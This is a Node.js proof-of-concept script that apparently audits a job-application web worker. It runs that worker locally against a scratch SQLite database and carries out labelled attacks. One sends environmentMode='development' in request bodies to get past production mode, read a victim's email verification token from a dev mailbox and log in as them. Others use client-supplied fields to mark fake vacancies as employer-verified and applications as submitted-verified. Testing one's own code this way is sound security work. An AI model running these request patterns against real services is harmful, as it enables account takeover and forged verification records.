const fs = require('fs');
const path = require('path');

const ROOT = fs.existsSync(path.join(__dirname, 'project')) ? path.join(__dirname, 'project') : __dirname;
const { ApexD1Database } = require(path.join(ROOT, 'dist/src/db/d1-sqlite-engine.js'));
const worker = require(path.join(ROOT, 'dist/src/worker.js')).default;

function createAsyncD1BindingFromSqlite(sqliteDb) {
  const makeStmt = (sql, boundParams = []) => ({
    bind(...values) { return makeStmt(sql, values); },
    async first(colName) {
      const row = sqliteDb.prepare(sql).bind(...boundParams).first();
      if (!row) return null;
      return colName ? (row[colName] ?? null) : row;
    },
    async run() {
      const res = sqliteDb.prepare(sql).bind(...boundParams).run();
      return { results: [], success: res.success, meta: { duration: 0.4, changes: res.meta.changes, last_row_id: res.meta.last_row_id, rows_read: 1, rows_written: Math.max(1, res.meta.changes) } };
    },
    async all() {
      const res = sqliteDb.prepare(sql).bind(...boundParams).all();
      return { results: res.results, success: true, meta: { duration: 0.3, changes: 0, last_row_id: 0, rows_read: Math.max(1, res.results.length), rows_written: 0 } };
    }
  });
  return {
    prepare(q) { return makeStmt(q, []); },
    async batch(stmts) { const out=[]; for (const s of stmts) out.push(await s.run()); return out; },
    async exec(q) { sqliteDb.execSchema(q); return { count: 1, duration: 1 }; }
  };
}

(async () => {
  const dbFile = '/tmp/ind_adv.sqlite';
  if (fs.existsSync(dbFile)) fs.unlinkSync(dbFile);
  const sqlite = new ApexD1Database(dbFile, { maxQueriesPerInvocation: 500 });
  for (const f of ['0001_genesis_schema.sql','0002_v2_resurrection.sql','0003_v8_reality_engine.sql']) {
    sqlite.execSchema(fs.readFileSync(path.join(ROOT, 'migrations', f), 'utf8'));
  }
  const d1 = createAsyncD1BindingFromSqlite(sqlite);
  const env = {
    APEX_DB: d1,
    APEX_SESSION_SECRET: 'production_secret_key_at_least_32_characters_long!!',
    APEX_ENV: 'production', // PRODUCTION!
  };

  // Attack 1: Client overrides production mode via request body environmentMode='development'
  const reg = await worker.fetch(new Request('https://apex.example/api/auth/register', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({
      email: 'victim-owner@company.com',
      displayName: 'Attacker',
      password: 'StrongPassword!2026',
      environmentMode: 'development'
    })
  }), env);
  const regJson = await reg.json();
  console.log('PRODUCTION configured:', env.APEX_ENV, 'REGISTER status:', reg.status, regJson.error || Boolean(regJson.user));

  // Attack 1b: Fetch verification token from dev mailbox in production by passing environmentMode='development'
  const oob = await worker.fetch(new Request('https://apex.example/api/dev/out-of-band-mailbox', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({
      email: 'victim-owner@company.com',
      environmentMode: 'development'
    })
  }), env);
  const oobJson = await oob.json();
  console.log('PRODUCTION DEV MAILBOX status:', oob.status, 'raw token in result?', Boolean(oobJson.outOfBandMessage?.secretToken));

  if (!oobJson.outOfBandMessage?.secretToken) return;

  const ver = await worker.fetch(new Request('https://apex.example/api/auth/verify-email', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({
      email: 'victim-owner@company.com',
      verificationToken: oobJson.outOfBandMessage.secretToken
    })
  }), env);
  console.log('VERIFY status:', ver.status);

  const login = await worker.fetch(new Request('https://apex.example/api/auth/session', {
    method: 'POST',
    headers: {'content-type':'application/json'},
    body: JSON.stringify({
      email: 'victim-owner@company.com',
      password: 'StrongPassword!2026'
    })
  }), env);
  const loginJson = await login.json();
  console.log('LOGIN status:', login.status, 'session issued?', Boolean(loginJson.sessionToken));

  // Attack 2: Browser/client marks arbitrary job VERIFIED on Worker
  const jobRes = await worker.fetch(new Request('https://apex.example/api/jobs/discover', {
    method: 'POST',
    headers: {
      'content-type':'application/json',
      authorization: `Bearer ${loginJson.sessionToken}`,
      'x-csrf-token': loginJson.csrfToken,
    },
    body: JSON.stringify({
      vacancies: [{
        externalId: 'fake_1',
        sourceFeed: 'Attacker',
        sourceUrl: 'https://boards.greenhouse.io/fake/jobs/1',
        title: 'Fake Verified CEO Role',
        companyName: 'FakeCorp',
        verifiedByEmployerFeed: true
      }]
    })
  }), env);
  const jobJson = await jobRes.json();
  console.log('USER-SUPPLIED VACANCY', jobRes.status, jobJson.verificationStatuses);

  // Attack 3: Client marks application SUBMITTED_VERIFIED by supplying externalConfirmationId in request body
  const subRes = await worker.fetch(new Request('https://apex.example/api/applications/submit', {
    method: 'POST',
    headers: {
      'content-type':'application/json',
      authorization: `Bearer ${loginJson.sessionToken}`,
      'x-csrf-token': loginJson.csrfToken,
    },
    body: JSON.stringify({
      jobId: jobJson.jobIds[0],
      resumeDocId: 'doc_fake',
      externalConfirmationId: 'attacker_typed_confirmation_123'
    })
  }), env);
  const subJson = await subRes.json();
  console.log('CLIENT-SUPPLIED RECEIPT', subRes.status, subJson.outcome?.status);
})();
